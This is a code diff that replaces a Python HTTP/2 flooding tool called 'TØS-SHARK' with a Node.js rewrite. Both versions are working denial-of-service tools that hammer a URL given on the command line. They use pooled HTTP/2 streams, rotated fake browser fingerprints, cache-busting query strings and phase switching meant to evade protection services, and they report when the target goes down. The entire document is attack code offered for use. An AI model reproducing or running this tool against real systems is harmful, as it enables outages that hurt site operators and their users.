@@ -1,668 +1,442 @@
-import time
-import random
-import threading
-import sys
-import os
-from datetime import datetime
-from hyper import HTTP20Connection
-from hyper.tls import init_context
+const http2 = require('http2');
+const http = require('http');
+const https = require('https');
+const { URL } = require('url');
 
-class T0S_SHARK_HYPER:
-    def __init__(self, target_url):
-        self.target_url = target_url
-        parsed_url = target_url.replace('https://', '').replace('http://', '')
-        if '/' in parsed_url:
-            self.hostname, path_part = parsed_url.split('/', 1)
-            self.path = '/' + path_part
-        else:
-            self.hostname = parsed_url
-            self.path = '/'
+class TOS_SHARK {
+    constructor(targetUrl) {
+        const url = new URL(targetUrl);
+        this.hostname = url.hostname;
+        this.path = url.pathname || '/';
+        this.targetUrl = targetUrl;
         
-        self.running = True
-        self.start_time = time.time()
-        self.total_requests = 0
-        self.requests_this_cycle = 0
-        self.cycle_start_time = time.time()
-        self.successful_requests = 0
-        self.blocked_requests = 0
+        this.running = true;
+        this.startTime = Date.now();
+        this.totalRequests = 0;
+        this.requestCounter = 0;
+        this.phase = 'H2_ATTACK';
+        this.phaseStart = Date.now();
+        this.nextPhaseChange = 0;
+        this.lastStatusLog = Date.now();
+        this.lastDownEvent = 0;
+        this.isHostDown = false;
         
-        # Attack methods with weights
-        self.attack_pool = {
-            'H2-MULTIPLEX': {
-                'weight': 1.0,
-                'success': 0,
-                'blocked': 0,
-                'avg_rps': 0,
-                'last_used': 0
-            },
-            'H2-PRIORITY-FLOOD': {
-                'weight': 1.0,
-                'success': 0,
-                'blocked': 0,
-                'avg_rps': 0,
-                'last_used': 0
-            },
-            'H2-SETTINGS-SPAM': {
-                'weight': 1.0,
-                'success': 0,
-                'blocked': 0,
-                'avg_rps': 0,
-                'last_used': 0
-            },
-            'H2-WINDOW-EXPLOIT': {
-                'weight': 1.0,
-                'success': 0,
-                'blocked': 0,
-                'avg_rps': 0,
-                'last_used': 0
-            },
-            'H2-PUSHPROMISE-FLOOD': {
-                'weight': 1.0,
-                'success': 0,
-                'blocked': 0,
-                'avg_rps': 0,
-                'last_used': 0
-            },
-            'H2-HEADER-COMPRESSION-ABUSE': {
-                'weight': 1.0,
-                'success': 0,
-                'blocked': 0,
-                'avg_rps': 0,
-                'last_used': 0
-            },
-            'H2-STREAM-RESET-SPAM': {
-                'weight': 1.0,
-                'success': 0,
-                'blocked': 0,
-                'avg_rps': 0,
-                'last_used': 0
+        // Protection Detection
+        this.protection = this.detectProtection();
+        this.mtCode = this.getMTCode();
+        
+        // H2 Connection Pool
+        this.h2Connections = [];
+        this.h2MaxConnections = 15;
+        this.h2ActiveStreams = 0;
+        
+        // H1 Agent
+        this.h1Agent = null;
+        
+        // Fingerprints & Headers
+        this.fingerprints = this.generateFingerprints();
+        this.currentFingerprint = 0;
+        this.routes = ['/', '/api', '/static', '/admin', '/data', '/users'];
+        this.methods = ['GET', 'HEAD', 'POST'];
+        this.headerSets = this.generateHeaderSets();
+        
+        // Initialize
+        this.init();
+    }
+
+    // ===== PROTECTION DETECTION =====
+    detectProtection() {
+        return 'CUSTOM';
+    }
+
+    getMTCode() {
+        const codes = {
+            'CLOUDFLARE': '1M22',
+            'VERCEL': '1M22Z',
+            'CUSTOM': '3M22',
+            'AKAMAI': '2M11'
+        };
+        return codes[this.protection] || '3M22';
+    }
+
+    // ===== LOGGING SYSTEM =====
+    color(text, color) {
+        const colors = {
+            red: '\x1b[91m',
+            green: '\x1b[92m',
+            yellow: '\x1b[93m',
+            blue: '\x1b[94m',
+            magenta: '\x1b[95m',
+            cyan: '\x1b[96m',
+            white: '\x1b[97m',
+            reset: '\x1b[0m'
+        };
+        return `${colors[color] || ''}${text}${colors.reset}`;
+    }
+
+    printHeader() {
+        console.clear();
+        console.log(`${this.color('TØS-SHARK', 'white')} | ${this.color(this.protection, 'red')} | MT-${this.mtCode}`);
+        console.log(this.color('-----------------------------------------------------------------', 'cyan'));
+    }
+
+    logStatus(status, duration) {
+        const now = Date.now();
+        if (now - this.lastStatusLog >= 5000) {
+            this.lastStatusLog = now;
+            
+            let color = 'green';
+            let statusText = status;
+            
+            if (status === 'TIMEOUT') {
+                color = 'red';
+                statusText = 'TIMEOUT';
+            } else if (status >= 500) {
+                color = 'red';
+                statusText = `${status}`;
+            } else if (status >= 400) {
+                color = 'yellow';
+                statusText = `${status}`;
+            } else if (status >= 300) {
+                color = 'blue';
+                statusText = `${status}`;
+            } else {
+                statusText = `${status}`;
             }
+            
+            const durationText = duration ? `${duration.toFixed(1)}s` : '0.0s';
+            console.log(`STS-HAROP-INT ---> ${this.color(statusText, color)}:${durationText}`);
         }
-        
-        # Connection pool
-        self.connections = []
-        self.max_connections = 15
-        self.active_streams = 0
-        self.max_streams_per_conn = 100
-        
-        # Status tracking
-        self.status_history = []
-        self.last_status_log = time.time()
-        self.current_methods = []
-        self.method_performance = {}
-        
-        # Initialize
-        self.clear_terminal()
-        print("[+] TØS-SHARK with HYPER (Real H2)")
-        print(f"[+] Target: {self.hostname}")
-        print("[+] Initializing connections...")
-        self.initialize_connections()
-        
-        # Start display thread
-        self.display_thread = threading.Thread(target=self.display_stats, daemon=True)
-        self.display_thread.start()
-        
-        # Start status logger
-        self.log_thread = threading.Thread(target=self.status_logger, daemon=True)
-        self.log_thread.start()
-    
-    def clear_terminal(self):
-        """Clear terminal once at start"""
-        os.system('cls' if os.name == 'nt' else 'clear')
-    
-    def color_text(self, text, color):
-        """Add ANSI color codes"""
-        colors = {
-            'red': '\033[91m',
-            'green': '\033[92m',
-            'yellow': '\033[93m',
-            'blue': '\033[94m',
-            'purple': '\033[95m',
-            'cyan': '\033[96m',
-            'reset': '\033[0m'
+    }
+
+    logDownEvent(status) {
+        const now = Date.now();
+        if (!this.isHostDown && now - this.lastDownEvent > 1000) {
+            this.isHostDown = true;
+            this.lastDownEvent = now;
+            
+            const statusText = typeof status === 'number' ? status : status;
+            const log = `{${this.mtCode}-${this.requestCounter} --> ${statusText}}`;
+            console.log(this.color(log, 'red'));
         }
-        return f"{colors.get(color, '')}{text}{colors['reset']}"
-    
-    def initialize_connections(self):
-        """Initialize HTTP/2 connections with hyper"""
-        for i in range(min(8, self.max_connections)):
-            try:
-                conn = HTTP20Connection(
-                    host=self.hostname,
-                    port=443,
-                    secure=True,
-                    enable_push=False,
-                    ssl_context=init_context()
-                )
-                self.connections.append({
-                    'conn': conn,
-                    'active_streams': 0,
-                    'requests': 0,
-                    'last_reset': time.time()
-                })
-                time.sleep(0.1)  # Stagger connections
-            except Exception as e:
-                print(f"[-] Connection {i+1} failed: {e}")
+    }
+
+    logHostRecovered() {
+        if (this.isHostDown) {
+            this.isHostDown = false;
+        }
+    }
+
+    isDownStatus(status) {
+        if (status === 'TIMEOUT' || status === 'ERROR') return true;
+        if (typeof status === 'number') {
+            if (status >= 500 && status < 600) return true;
+            if ([429, 430, 431, 451].includes(status)) return true;
+        }
+        return false;
+    }
+
+    // ===== ATTACK ENGINE =====
+    generateFingerprints() {
+        const prints = [];
+        for (let i = 0; i < 50; i++) {
+            prints.push({
+                userAgent: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.${i}`,
+                accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                language: 'en-US,en;q=0.9',
+                encoding: 'gzip, deflate, br'
+            });
+        }
+        return prints;
+    }
+
+    generateHeaderSets() {
+        const sets = [];
+        for (let i = 0; i < 20; i++) {
+            sets.push({
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'accept-language': 'en-US,en;q=0.9',
+                'accept-encoding': 'gzip, deflate, br',
+                'cache-control': 'no-cache',
+                'pragma': 'no-cache'
+            });
+        }
+        return sets;
+    }
+
+    init() {
+        this.printHeader();
+        console.log(this.color(`Target: ${this.hostname}`, 'yellow'));
+        console.log(this.color('Initializing attack engine...', 'green'));
         
-        print(f"[+] {len(self.connections)} H2 connections established")
-    
-    def get_connection(self):
-        """Get a connection with available streams"""
-        if not self.connections:
-            return None
+        // Setup connections
+        this.setupH2Connections();
+        this.h1Agent = new http.Agent({
+            keepAlive: true,
+            maxSockets: 100,
+            maxFreeSockets: 50,
+            timeout: 5000
+        });
         
-        # Find connection with most available streams
-        available = []
-        for conn_data in self.connections:
-            available_streams = self.max_streams_per_conn - conn_data['active_streams']
-            if available_streams > 0:
-                available.append((conn_data, available_streams))
+        // Start systems
+        setTimeout(() => {
+            this.startAttackCycle();
+            this.startDisplay();
+        }, 2000);
+    }
+
+    setupH2Connections() {
+        for (let i = 0; i < this.h2MaxConnections; i++) {
+            setTimeout(() => {
+                try {
+                    const client = http2.connect(this.targetUrl, {
+                        maxSessionMemory: 32768
+                    });
+                    client.setMaxListeners(1000);
+                    client.on('error', () => {});
+                    this.h2Connections.push(client);
+                } catch (err) {}
+            }, i * 100);
+        }
+    }
+
+    resetH2Connections() {
+        this.h2Connections.forEach(client => {
+            try { client.destroy(); } catch (err) {}
+        });
+        this.h2Connections = [];
+        this.setupH2Connections();
+    }
+
+    getRandomRoute() {
+        return this.routes[Math.floor(Math.random() * this.routes.length)];
+    }
+
+    getRandomMethod() {
+        return this.methods[Math.floor(Math.random() * this.methods.length)];
+    }
+
+    getRandomHeaders() {
+        const fp = this.fingerprints[this.currentFingerprint];
+        const headers = this.headerSets[Math.floor(Math.random() * this.headerSets.length)];
+        return {
+            ...headers,
+            'user-agent': fp.userAgent
+        };
+    }
+
+    async sendH2Request() {
+        if (this.h2Connections.length === 0) return null;
         
-        if not available:
-            return None
+        const startTime = Date.now();
+        const client = this.h2Connections[Math.floor(Math.random() * this.h2Connections.length)];
+        this.requestCounter++;
         
-        # Return connection with most available streams
-        available.sort(key=lambda x: x[1], reverse=True)
-        return available[0][0]
-    
-    def attack_h2_multiplex(self, duration=30):
-        """H2-MULTIPLEX: Multiple concurrent streams"""
-        start_time = time.time()
-        requests_sent = 0
-        success_count = 0
-        blocked_count = 0
-        
-        print(f"[→] Starting H2-MULTIPLEX (30s)")
-        
-        while time.time() - start_time < duration and self.running:
-            conn_data = self.get_connection()
-            if not conn_data:
-                time.sleep(0.01)
-                continue
+        try {
+            const method = this.getRandomMethod();
+            const route = this.getRandomRoute();
+            const headers = this.getRandomHeaders();
             
-            # Send multiple streams
-            streams_this_batch = min(10, self.max_streams_per_conn - conn_data['active_streams'])
+            const h2Headers = {
+                ':method': method,
+                ':path': `${route}?_=${Date.now()}&r=${this.requestCounter}`,
+                ':authority': this.hostname,
+                ...headers
+            };
             
-            for i in range(streams_this_batch):
-                try:
-                    conn_data['active_streams'] += 1
-                    self.active_streams += 1
-                    
-                    headers = {
-                        ':method': 'GET',
-                        ':path': f'{self.path}?multiplex={requests_sent}&ts={int(time.time())}',
-                        ':authority': self.hostname,
-                        ':scheme': 'https',
-                        'user-agent': 'Mozilla/5.0',
-                        'accept': '*/*'
-                    }
-                    
-                    stream_id = conn_data['conn'].request(headers)
-                    response = conn_data['conn'].get_response(stream_id)
-                    
-                    status = response.status
-                    self.total_requests += 1
-                    requests_sent += 1
-                    conn_data['requests'] += 1
-                    
-                    # Track status for logging
-                    self.status_history.append({
-                        'time': time.time(),
-                        'status': status,
-                        'method': 'H2-MULTIPLEX'
-                    })
-                    
-                    if status == 200:
-                        success_count += 1
-                        self.successful_requests += 1
-                    else:
-                        blocked_count += 1
-                        self.blocked_requests += 1
-                    
-                    conn_data['active_streams'] -= 1
-                    self.active_streams -= 1
-                    
-                except Exception as e:
-                    conn_data['active_streams'] -= 1
-                    self.active_streams -= 1
-                    blocked_count += 1
-                    self.blocked_requests += 1
-                    self.total_requests += 1
-                    requests_sent += 1
-            
-            time.sleep(0.01)  # Small delay between batches
-        
-        # Update method stats
-        total = success_count + blocked_count
-        if total > 0:
-            rps = requests_sent / duration
-            success_rate = success_count / total
-            
-            self.attack_pool['H2-MULTIPLEX']['success'] += success_count
-            self.attack_pool['H2-MULTIPLEX']['blocked'] += blocked_count
-            self.attack_pool['H2-MULTIPLEX']['avg_rps'] = (
-                self.attack_pool['H2-MULTIPLEX']['avg_rps'] * 0.7 + rps * 0.3
-            )
-            self.attack_pool['H2-MULTIPLEX']['weight'] = success_rate
-            self.attack_pool['H2-MULTIPLEX']['last_used'] = time.time()
-        
-        return requests_sent, success_count, blocked_count
-    
-    def attack_h2_priority_flood(self, duration=25):
-        """H2-PRIORITY-FLOOD: Priority stream spam"""
-        start_time = time.time()
-        requests_sent = 0
-        success_count = 0
-        blocked_count = 0
-        
-        print(f"[→] Starting H2-PRIORITY-FLOOD (25s)")
-        
-        while time.time() - start_time < duration and self.running:
-            conn_data = self.get_connection()
-            if not conn_data:
-                time.sleep(0.01)
-                continue
-            
-            try:
-                conn_data['active_streams'] += 1
-                self.active_streams += 1
+            return new Promise((resolve) => {
+                const timeout = setTimeout(() => {
+                    resolve({ status: 'TIMEOUT', duration: 5 });
+                }, 5000);
                 
-                headers = {
-                    ':method': 'GET',
-                    ':path': f'{self.path}?priority={requests_sent}&weight={random.randint(1,256)}',
-                    ':authority': self.hostname,
-                    ':scheme': 'https',
-                    'user-agent': 'Mozilla/5.0',
-                    'accept': '*/*'
+                const req = client.request(h2Headers);
+                
+                if (method === 'POST') {
+                    req.write('');
                 }
                 
-                stream_id = conn_data['conn'].request(headers)
-                response = conn_data['conn'].get_response(stream_id)
+                req.on('response', (responseHeaders) => {
+                    clearTimeout(timeout);
+                    const duration = (Date.now() - startTime) / 1000;
+                    const status = responseHeaders[':status'];
+                    resolve({ status, duration });
+                });
                 
-                status = response.status
-                self.total_requests += 1
-                requests_sent += 1
-                conn_data['requests'] += 1
+                req.on('error', (err) => {
+                    clearTimeout(timeout);
+                    const duration = (Date.now() - startTime) / 1000;
+                    resolve({ status: 'ERROR', duration });
+                });
                 
-                self.status_history.append({
-                    'time': time.time(),
-                    'status': status,
-                    'method': 'H2-PRIORITY-FLOOD'
-                })
-                
-                if status == 200:
-                    success_count += 1
-                    self.successful_requests += 1
-                else:
-                    blocked_count += 1
-                    self.blocked_requests += 1
-                
-                conn_data['active_streams'] -= 1
-                self.active_streams -= 1
-                
-            except Exception:
-                if 'conn_data' in locals():
-                    conn_data['active_streams'] -= 1
-                    self.active_streams -= 1
-                blocked_count += 1
-                self.blocked_requests += 1
-                self.total_requests += 1
-                requests_sent += 1
+                req.end();
+            });
             
-            time.sleep(0.02)  # Slightly slower for priority
+        } catch (err) {
+            return { status: 'ERROR', duration: 0 };
+        }
+    }
+
+    async sendH1Request() {
+        const startTime = Date.now();
+        this.requestCounter++;
         
-        # Update stats
-        total = success_count + blocked_count
-        if total > 0:
-            rps = requests_sent / duration
-            success_rate = success_count / total
+        return new Promise((resolve) => {
+            const timeout = setTimeout(() => {
+                resolve({ status: 'TIMEOUT', duration: 5 });
+            }, 5000);
             
-            self.attack_pool['H2-PRIORITY-FLOOD']['success'] += success_count
-            self.attack_pool['H2-PRIORITY-FLOOD']['blocked'] += blocked_count
-            self.attack_pool['H2-PRIORITY-FLOOD']['avg_rps'] = (
-                self.attack_pool['H2-PRIORITY-FLOOD']['avg_rps'] * 0.7 + rps * 0.3
-            )
-            self.attack_pool['H2-PRIORITY-FLOOD']['weight'] = success_rate
-            self.attack_pool['H2-PRIORITY-FLOOD']['last_used'] = time.time()
-        
-        return requests_sent, success_count, blocked_count
-    
-    def attack_h2_settings_spam(self, duration=20):
-        """H2-SETTINGS-SPAM: Settings frame manipulation"""
-        start_time = time.time()
-        requests_sent = 0
-        success_count = 0
-        blocked_count = 0
-        
-        print(f"[→] Starting H2-SETTINGS-SPAM (20s)")
-        
-        while time.time() - start_time < duration and self.running:
-            conn_data = self.get_connection()
-            if not conn_data:
-                time.sleep(0.01)
-                continue
+            const options = {
+                hostname: this.hostname,
+                port: 443,
+                path: `${this.getRandomRoute()}?h1=${Date.now()}`,
+                method: 'GET',
+                agent: this.h1Agent,
+                headers: { 'Connection': 'close' },
+                timeout: 5000
+            };
             
-            try:
-                # Send settings-like request
-                conn_data['active_streams'] += 1
-                self.active_streams += 1
-                
-                headers = {
-                    ':method': 'GET',
-                    ':path': f'{self.path}?settings={requests_sent}',
-                    ':authority': self.hostname,
-                    ':scheme': 'https',
-                    'user-agent': 'Mozilla/5.0',
-                    'accept': '*/*',
-                    'x-http2-settings': 'AAEAAQAAAAIAAAABAAMAAABkAAQBAAAA'
+            const req = https.request(options, (res) => {
+                clearTimeout(timeout);
+                const duration = (Date.now() - startTime) / 1000;
+                resolve({ status: res.statusCode, duration });
+                res.destroy();
+            });
+            
+            req.on('error', (err) => {
+                clearTimeout(timeout);
+                const duration = (Date.now() - startTime) / 1000;
+                resolve({ status: 'ERROR', duration });
+            });
+            
+            req.on('timeout', () => {
+                req.destroy();
+                resolve({ status: 'TIMEOUT', duration: 5 });
+            });
+            
+            req.end();
+        });
+    }
+
+    async sendH3Request() {
+        return this.sendH1Request();
+    }
+
+    async startAttackCycle() {
+        while (this.running) {
+            const now = Date.now();
+            
+            // Phase switching
+            if (now >= this.nextPhaseChange) {
+                if (this.phase === 'H2_ATTACK') {
+                    this.phase = 'H1_H3_PHASE';
+                    const h1Duration = 19000 + Math.random() * 3000;
+                    this.nextPhaseChange = now + h1Duration;
+                    this.phaseStart = now;
+                    this.resetH2Connections();
+                } else {
+                    this.phase = 'H2_ATTACK';
+                    const h2Duration = 120000 + Math.random() * 100000;
+                    this.nextPhaseChange = now + h2Duration;
+                    this.phaseStart = now;
                 }
+            }
+            
+            // Execute requests based on phase
+            let result;
+            if (this.phase === 'H2_ATTACK') {
+                result = await this.sendH2Request();
+                this.totalRequests++;
+            } else {
+                if (Math.random() < 0.8) {
+                    result = await this.sendH1Request();
+                } else {
+                    result = await this.sendH3Request();
+                }
+                this.totalRequests++;
+            }
+            
+            // Process result and log
+            if (result) {
+                this.logStatus(result.status, result.duration);
                 
-                stream_id = conn_data['conn'].request(headers)
-                response = conn_data['conn'].get_response(stream_id)
-                
-                status = response.status
-                self.total_requests += 1
-                requests_sent += 1
-                conn_data['requests'] += 1
-                
-                self.status_history.append({
-                    'time': time.time(),
-                    'status': status,
-                    'method': 'H2-SETTINGS-SPAM'
-                })
-                
-                if status == 200:
-                    success_count += 1
-                    self.successful_requests += 1
-                else:
-                    blocked_count += 1
-                    self.blocked_requests += 1
-                
-                conn_data['active_streams'] -= 1
-                self.active_streams -= 1
-                
-            except Exception:
-                if 'conn_data' in locals():
-                    conn_data['active_streams'] -= 1
-                    self.active_streams -= 1
-                blocked_count += 1
-                self.blocked_requests += 1
-                self.total_requests += 1
-                requests_sent += 1
+                if (this.isDownStatus(result.status)) {
+                    this.logDownEvent(result.status);
+                } else {
+                    this.logHostRecovered();
+                }
+            }
             
-            time.sleep(0.03)  # Slower for settings spam
-        
-        # Update stats
-        total = success_count + blocked_count
-        if total > 0:
-            rps = requests_sent / duration
-            success_rate = success_count / total
-            
-            self.attack_pool['H2-SETTINGS-SPAM']['success'] += success_count
-            self.attack_pool['H2-SETTINGS-SPAM']['blocked'] += blocked_count
-            self.attack_pool['H2-SETTINGS-SPAM']['avg_rps'] = (
-                self.attack_pool['H2-SETTINGS-SPAM']['avg_rps'] * 0.7 + rps * 0.3
-            )
-            self.attack_pool['H2-SETTINGS-SPAM']['weight'] = success_rate
-            self.attack_pool['H2-SETTINGS-SPAM']['last_used'] = time.time()
-        
-        return requests_sent, success_count, blocked_count
-    
-    def select_methods(self):
-        """Select 3-4 methods based on performance"""
-        methods = list(self.attack_pool.keys())
-        
-        # Calculate weights (favor successful methods)
-        weights = []
-        for method in methods:
-            stats = self.attack_pool[method]
-            total = stats['success'] + stats['blocked']
-            
-            if total == 0:
-                weight = 1.0  # Default for untested
-            else:
-                success_rate = stats['success'] / total
-                # Boost methods not used recently
-                time_since_last = time.time() - stats['last_used']
-                recency_boost = min(2.0, 1.0 + (time_since_last / 300))  # Boost after 5 mins
-                weight = success_rate * recency_boost
-            
-            weights.append(weight)
-        
-        # Normalize weights
-        total_weight = sum(weights)
-        if total_weight > 0:
-            weights = [w/total_weight for w in weights]
-        
-        # Select 3-4 unique methods
-        num_methods = random.randint(3, 4)
-        selected = []
-        
-        for _ in range(num_methods * 2):  # Try twice as many to get unique
-            if len(selected) >= num_methods:
-                break
-            
-            method = random.choices(methods, weights=weights, k=1)[0]
-            if method not in selected:
-                selected.append(method)
-                # Reduce weight for this method to encourage variety
-                idx = methods.index(method)
-                weights[idx] *= 0.3
-        
-        # Ensure we have enough methods
-        while len(selected) < 3:
-            extra = random.choice(methods)
-            if extra not in selected:
-                selected.append(extra)
-        
-        self.current_methods = selected
-        return selected
-    
-    def status_logger(self):
-        """Log status codes every 20 seconds"""
-        while self.running:
-            time.sleep(20)
-            
-            if not self.status_history:
-                continue
-            
-            # Get most recent status
-            recent_statuses = [s for s in self.status_history 
-                             if time.time() - s['time'] < 30]  # Last 30 seconds
-            
-            if not recent_statuses:
-                continue
-            
-            # Get most common status
-            status_counts = {}
-            for s in recent_statuses:
-                status_counts[s['status']] = status_counts.get(s['status'], 0) + 1
-            
-            most_common = max(status_counts.items(), key=lambda x: x[1])
-            status_code = most_common[0]
-            
-            # Determine color
-            if status_code in [429, 403, 503]:
-                color = 'red'
-                status_type = 'BLOCKED'
-            elif status_code >= 500:
-                color = 'yellow'
-                status_type = 'ERROR'
-            elif status_code >= 400:
-                color = 'yellow'
-                status_type = 'CLIENT_ERR'
-            elif status_code >= 300:
-                color = 'blue'
-                status_type = 'REDIRECT'
-            elif status_code == 200:
-                color = 'green'
-                status_type = 'OK'
-            else:
-                color = 'cyan'
-                status_type = 'UNKNOWN'
-            
-            # Create and print log
-            log_msg = f"HPS-3M22-{status_type}-{status_code}"
-            colored_msg = self.color_text(log_msg, color)
-            print(colored_msg)
-            
-            # Clear old history
-            self.status_history = [s for s in self.status_history 
-                                 if time.time() - s['time'] < 300]  # Keep 5 minutes
-    
-    def display_stats(self):
-        """Display real-time statistics"""
-        while self.running:
-            time.sleep(2)
-            
-            runtime = time.time() - self.start_time
-            hours = int(runtime // 3600)
-            minutes = int((runtime % 3600) // 60)
-            seconds = int(runtime % 60)
-            
-            # Calculate RPS
-            cycle_time = time.time() - self.cycle_start_time
-            if cycle_time > 0:
-                current_rps = self.requests_this_cycle / cycle_time
-            else:
-                current_rps = 0
-            
-            # Calculate success rate
-            total = self.successful_requests + self.blocked_requests
-            success_rate = (self.successful_requests / total * 100) if total > 0 else 0
-            
-            os.system('cls' if os.name == 'nt' else 'clear')
-            
-            print("=" * 60)
-            print(self.color_text("TØS-SHARK — SEA MONSTER TRAFFIC", "cyan"))
-            print("=" * 60)
-            print(f"Target: {self.color_text(self.hostname, 'yellow')}")
-            print(f"Runtime: {hours:02d}:{minutes:02d}:{seconds:02d}")
-            print(f"Active Methods: {', '.join(self.current_methods) if self.current_methods else 'None'}")
-            print("-" * 60)
-            print(f"Total Requests: {self.color_text(str(self.total_requests), 'green')}")
-            print(f"Current RPS: {self.color_text(f'{current_rps:.1f}', 'green')}")
-            print(f"Success Rate: {self.color_text(f'{success_rate:.1f}%', 'green' if success_rate > 70 else 'yellow')}")
-            print(f"Active Streams: {self.active_streams}/{self.max_streams_per_conn * len(self.connections)}")
-            print(f"Connections: {len(self.connections)}/{self.max_connections}")
-            print("-" * 60)
-            
-            # Show method effectiveness
-            print("Method Performance:")
-            for method in self.current_methods[:3]:  # Show top 3
-                stats = self.attack_pool[method]
-                total = stats['success'] + stats['blocked']
-                if total > 0:
-                    rate = (stats['success'] / total) * 100
-                    color = 'green' if rate > 70 else 'yellow' if rate > 30 else 'red'
-                    print(f"  {method}: {self.color_text(f'{rate:.1f}%', color)} "
-                          f"(RPS: {stats['avg_rps']:.1f})")
-            
-            print("=" * 60)
-    
-    def attack_cycle(self):
-        """Execute one attack cycle with selected methods"""
-        self.cycle_start_time = time.time()
-        self.requests_this_cycle = 0
-        
-        # Select methods for this cycle
-        methods = self.select_methods()
-        print(f"\n[+] Selected methods: {', '.join(methods)}")
-        
-        # Execute each method
-        for method in methods:
-            if not self.running:
-                break
-            
-            if method == 'H2-MULTIPLEX':
-                sent, success, blocked = self.attack_h2_multiplex()
-                self.requests_this_cycle += sent
-            elif method == 'H2-PRIORITY-FLOOD':
-                sent, success, blocked = self.attack_h2_priority_flood()
-                self.requests_this_cycle += sent
-            elif method == 'H2-SETTINGS-SPAM':
-                sent, success, blocked = self.attack_h2_settings_spam()
-                self.requests_this_cycle += sent
-            else:
-                # Placeholder for other methods
-                print(f"[!] {method} not implemented, skipping")
-                time.sleep(5)
-                continue
-        
-        # Dynamic cooldown based on performance
-        success_rate = (self.successful_requests / (self.successful_requests + self.blocked_requests)) * 100 \
-            if (self.successful_requests + self.blocked_requests) > 0 else 0
-        
-        if success_rate > 80:
-            cooldown = random.uniform(2, 5)  # Short cooldown if doing well
-        elif success_rate > 50:
-            cooldown = random.uniform(5, 10)  # Medium cooldown
-        else:
-            cooldown = random.uniform(10, 20)  # Long cooldown if struggling
-        
-        print(f"[~] Cooldown: {cooldown:.1f}s (Success rate: {success_rate:.1f}%)")
-        time.sleep(cooldown)
-    
-    def start(self):
-        """Start the attack"""
-        print("[+] TØS-SHARK starting...")
-        print("[+] Using HYPER for real HTTP/2 attacks")
-        print("[+] Press Ctrl+C to stop\n")
-        
-        time.sleep(2)
-        
-        cycle_count = 0
-        try:
-            while self.running:
-                cycle_count += 1
-                self.attack_cycle()
-                
-        except KeyboardInterrupt:
-            print("\n[!] Stopping TØS-SHARK...")
-            self.running = False
-        
-        finally:
-            # Final stats
-            total_time = time.time() - self.start_time
-            avg_rps = self.total_requests / total_time if total_time > 0 else 0
-            
-            print("\n" + "=" * 60)
-            print(self.color_text("FINAL STATISTICS", "cyan"))
-            print("=" * 60)
-            print(f"Total Runtime: {total_time:.1f}s")
-            print(f"Total Requests: {self.total_requests}")
-            print(f"Average RPS: {avg_rps:.1f}")
-            print(f"Success Rate: {(self.successful_requests/(self.successful_requests+self.blocked_requests)*100 if (self.successful_requests+self.blocked_requests)>0 else 0):.1f}%")
-            print(f"Attack Cycles: {cycle_count}")
-            print("=" * 60)
-            
-            # Method breakdown
-            print("\nMethod Performance Breakdown:")
-            for method, stats in self.attack_pool.items():
-                total = stats['success'] + stats['blocked']
-                if total > 0:
-                    rate = (stats['success'] / total) * 100
-                    print(f"  {method}: {rate:.1f}% success, "
-                          f"Avg RPS: {stats['avg_rps']:.1f}")
-            
-            print("\n[+] TØS-SHARK stopped.")
+            // Small delay
+            await new Promise(resolve => setTimeout(resolve, 0.1));
+        }
+    }
 
-def main():
-    if len(sys.argv) != 2:
-        print("Usage: python t0s_shark_hyper.py https://target.com")
-        sys.exit(1)
-    
-    target_url = sys.argv[1]
-    shark = T0S_SHARK_HYPER(target_url)
-    shark.start()
+    startDisplay() {
+        const display = () => {
+            if (!this.running) return;
+            
+            const runtime = Date.now() - this.startTime;
+            const phaseTime = Date.now() - this.phaseStart;
+            const phaseRemaining = Math.max(0, this.nextPhaseChange - Date.now());
+            
+            const hours = Math.floor(runtime / 3600000);
+            const minutes = Math.floor((runtime % 3600000) / 60000);
+            const seconds = Math.floor((runtime % 60000) / 1000);
+            
+            // Print header on each display update
+            this.printHeader();
+            
+            // Stats
+            console.log(`Target: ${this.color(this.hostname, 'yellow')}`);
+            console.log(`Runtime: ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`);
+            console.log(`Phase: ${this.color(this.phase, this.phase === 'H2_ATTACK' ? 'green' : 'magenta')}`);
+            console.log(`Phase Time: ${Math.round(phaseTime/1000)}s | Next: ${Math.round(phaseRemaining/1000)}s`);
+            console.log(this.color('-----------------------------------------------------------------', 'cyan'));
+            console.log(`Total Requests: ${this.color(this.totalRequests.toLocaleString(), 'green')}`);
+            console.log(`Request #: ${this.requestCounter}`);
+            console.log(`H2 Connections: ${this.h2Connections.length}`);
+            console.log(`Host Status: ${this.isHostDown ? this.color('DOWN', 'red') : this.color('UP', 'green')}`);
+            console.log(this.color('-----------------------------------------------------------------', 'cyan'));
+            
+            // Calculate RPS
+            const rps = this.totalRequests / (runtime / 1000);
+            console.log(`Average RPS: ${this.color(rps.toFixed(1), 'green')}`);
+            
+            setTimeout(display, 1000);
+        };
+        
+        display();
+    }
 
-if __name__ == "__main__":
-    # Check for hyper installation
-    try:
-        from hyper import HTTP20Connection
-    except ImportError:
-        print("Error: hyper library not installed!")
-        print("Install with: pip install hyper")
-        sys.exit(1)
+    stop() {
+        this.running = false;
+        // NO FINAL STATS - just exit
+        this.h2Connections.forEach(client => {
+            try { client.destroy(); } catch (err) {}
+        });
+        if (this.h1Agent) this.h1Agent.destroy();
+        process.exit(0);
+    }
+}
+
+// Main execution
+if (require.main === module) {
+    if (process.argv.length !== 3) {
+        console.log('Usage: node TOS.js https://target.com');
+        process.exit(1);
+    }
     
-    main()
+    const target = process.argv[2];
+    if (!target.startsWith('https://')) {
+        console.log('Error: Target must use HTTPS');
+        process.exit(1);
+    }
+    
+    const shark = new TOS_SHARK(target);
+    
+    process.on('SIGINT', () => {
+        shark.stop();
+    });
+}
+
+module.exports = TOS_SHARK;
